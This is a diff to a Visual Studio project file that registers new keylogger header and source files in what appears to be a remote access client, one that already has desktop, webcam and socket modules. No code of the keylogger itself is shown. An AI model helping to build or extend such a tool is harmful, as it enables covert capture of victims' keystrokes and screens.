@@ -155,7 +155,10 @@
   </ItemDefinitionGroup>
   <ItemGroup>
     <ClInclude Include="info_functions.h" />
+    <ClInclude Include="task\client_tasks\keylogger\keyhook.h" />
+    <ClInclude Include="task\client_tasks\keylogger\keylogger_client.h" />
     <ClInclude Include="resource.h" />
+    <ClInclude Include="task\client_tasks\keylogger\key_constrants.h" />
     <ClInclude Include="task\client_tasks\socket_client.h" />
     <ClInclude Include="task\client_tasks\desktop_client.h" />
     <ClInclude Include="func\curl.hpp" />
@@ -180,6 +183,7 @@
     <ClInclude Include="task\client_tasks\webcam_client.h" />
   </ItemGroup>
   <ItemGroup>
+    <ClCompile Include="task\client_tasks\keylogger\keylogger_client.cpp" />
     <ClCompile Include="task\client_tasks\socket_client.cpp" />
     <ClCompile Include="task\client_tasks\desktop_client.cpp" />
     <ClCompile Include="http\base\internal_request.cpp" />
